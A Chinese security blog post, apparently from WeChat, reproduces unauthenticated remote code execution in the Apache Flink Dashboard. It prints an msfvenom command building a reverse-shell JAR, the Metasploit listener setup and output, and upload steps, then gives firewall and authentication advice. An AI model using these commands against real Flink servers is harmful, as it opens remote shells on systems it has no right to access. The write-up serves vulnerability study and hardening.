\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/aomCajnZVA9WlnBqTE\_QPg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ibQicHibY6xFUL37mnBF9dP6TZd6s4O3HNYH5aGEiaNWPKibrMC0dH9O5ng/640?wx_fmt=jpeg)

好久没更新了，今天趁 1024 更新一篇，最近工作中遇到这个漏洞，今天自己来做一下这个漏洞复现。  

Apache Flink 未授权访问 - 远程代码命令执行 - 复现

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ZicpFA9aae4QzmqibdyErO2VmtSIhBWJk6y14KDq7p2HOibMqvTVWxMtg/640?wx_fmt=png)

一、漏洞简介

Apache Flink Dashboard 默认没有用户权限认证。攻击者可以通过未授权的 Flink Dashboard 控制台，直接上传木马 jar 包，可远程执行任意系统命令获取服务器权限，风险极大。

二、影响版本  

Apache Flink <= 1.9.1(最新版本)

三、漏洞复现  

1、生成反弹 jar 包

```
msfvenom -p java/meterpreter/reverse\_tcp LHOST=XX.XX.XX.XX LPORT=4444 -f jar > rce.jar
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ29NcynmIT5zyhzFzJFb3najTKY1hoWqRxoVlq0FJt19rUq60Ip1suiag/640?wx_fmt=png)

2、msf 设置监听  

```
msf5 > use exploit/multi/handler 
\[\*\] Using configured payload generic/shell\_reverse\_tcp
msf5 exploit(multi/handler) > set payload java/shell/reverse\_tcp 
payload => java/shell/reverse\_tcp
msf5 exploit(multi/handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (java/shell/reverse\_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set LHOST XX.XX.XX.XX
LHOST => XX.XX.XX.XX
msf5 exploit(multi/handler) > exploit 

\[\*\] Started reverse TCP handler on XX.XX.XX.XX:4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2NglLRz2ERUXYEIpq8dsUoDJVU4ht7Eo87wqcOqxOTzxX4UuLTpcyeg/640?wx_fmt=png)

3、上传 Jar 包，并且提交

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2ISveMsiau7Y6ADiaA0z1BKy99iaLZHibklQaxXZgZxgDUFdo0LjWBCKy3w/640?wx_fmt=png)

监听接受反弹的 shell，获取权限  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcOs6KRgHrcLIZBSj7uFiaZ2KIMaD4Wal5uARCpI5HYhDGCb67iaAd4J8aBCj5L3KKTcbaZ7ibxSQ11w/640?wx_fmt=png)

四、安全建议

1\. 请关注 Apache Flink 官方以便获取更新信息：https://flink.apache.org/

2\. 针对 ApacheFlinkDashboard 设置防火墙策略 (禁止 Dashboard 对外访问，或者确保只对可信端点开放)， 仅允许白名单 IP 进行访问，并在 Web 代理中增加对该服务的 Digest 认证，防止未授权访问。关于认证设置可参考链接：

https://httpd.apache.org/docs/2.4/mod/mod\_auth\_digest.html。

五、参考连接

http://www.llidc.com/news/858.html

https://nitec.jhun.edu.cn/da/64/c4987a121444/page.htm

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq\_37602797/category\_10169006.html

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)